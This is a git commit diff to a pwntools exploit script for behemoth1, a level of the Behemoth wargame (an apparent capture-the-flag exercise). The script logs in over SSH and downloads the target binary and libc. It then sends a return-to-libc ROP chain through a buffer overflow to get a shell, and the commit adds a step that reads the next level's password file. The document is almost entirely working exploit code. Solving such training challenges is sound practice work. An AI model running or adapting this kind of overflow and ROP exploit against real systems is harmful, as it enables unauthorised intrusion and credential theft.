bcfac97f14fe3a55a1599f53eac4bf88ab512f47
Taldgan <bananaphone993@live.com>
2021-06-27 15:31:16 -0500

    behemoth1 rxploit update

--- behemoth/behemoth1/rxploit.py
+++ behemoth/behemoth1/rxploit.py
@@ -5,7 +5,6 @@ import os
 OVERFLOW = 71
 
 context.arch = 'i386'
-binary = ELF("behemoth1")
 
 level = 1
 USER = 'behemoth%s' % level
@@ -16,10 +15,12 @@ PORT = 2221
 log.info("Attempting to connect to " + USER + "@" + HOST + " on port " + str(PORT) + "...")
 sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
 log.success("Success connecting...")
-log.info("Downloading libc file for " + USER + "...")
+log.info("Downloading binary and libc file for " + USER + "...")
 
 #Download libc used for behemoth to find symbols
+sh.download_file('/behemoth/%s' % USER)
 sh.download_file('/lib32/libc.so.6', local="libc")
+binary = ELF("behemoth1")
 libc = ELF("libc")
 
 #Found using 'ldd behemoth1'
@@ -34,5 +35,8 @@ rop.raw(next(libc.search(b'/bin/sh')))
 log.info("Executing behemoth1")
 io = sh.run('/behemoth/' + USER)
 io.sendline(rop.chain())
-io.interactive()
+io.sendline("cat /etc/behemoth_pass/behemoth%s" % (level+1) + "; exit")
+io.recvline()
+io.recvline()
+log.success("behemoth%s " % (level+1) + " pass: " + io.recvline().decode("utf-8"))
 os.remove("libc")
